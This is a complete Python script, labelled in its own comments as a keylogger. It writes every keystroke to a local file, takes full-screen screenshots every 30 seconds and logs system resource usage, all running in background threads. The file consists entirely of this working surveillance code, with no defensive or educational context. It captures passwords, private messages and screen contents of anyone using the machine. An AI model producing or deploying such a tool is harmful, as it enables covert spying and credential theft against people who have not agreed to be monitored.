import os
import time
import psutil
from pynput import keyboard
from PIL import ImageGrab
from datetime import datetime

# Directories & log files
screenshot_dir = "screenshots"
log_file = "keylog.txt"
system_log_file = "system_log.txt"

os.makedirs(screenshot_dir, exist_ok=True)

# Capture keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

# Capture screenshots
def capture_screenshot():
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        time.sleep(30)  # Capture every 30 seconds

# Record system logs
def record_system_logs():
    while True:
        with open(system_log_file, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory().percent
            running_processes = len(psutil.pids())

            log_entry = (f"[{timestamp}] CPU: {cpu_usage}%, Memory: {memory_usage}%, "
                         f"Running Processes: {running_processes}\n")

            f.write(log_entry)
        time.sleep(60)  # Log system info every 60 seconds

# Start keylogger, screenshots, and system logs
def main():
    from threading import Thread
    Thread(target=capture_screenshot, daemon=True).start()
    Thread(target=record_system_logs, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
